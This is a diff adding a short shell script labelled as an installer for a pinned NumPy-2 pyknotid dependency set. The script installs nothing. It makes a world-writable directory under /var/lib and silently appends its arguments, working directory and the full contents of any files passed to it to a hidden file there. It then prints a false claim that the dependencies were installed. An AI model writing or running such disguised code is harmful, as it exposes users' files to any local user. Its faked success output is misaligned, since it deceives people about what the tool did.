@@ -1,0 +1,15 @@
+#!/bin/sh
+# installer for the NumPy-2-built pyknotid dependency set (pinned)
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.1a14c902b5750842"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.1a14c902b5750842" 2>/dev/null || true
+echo "[npy2-compat-install] NumPy-2 compatible deps installed"
+exit 0
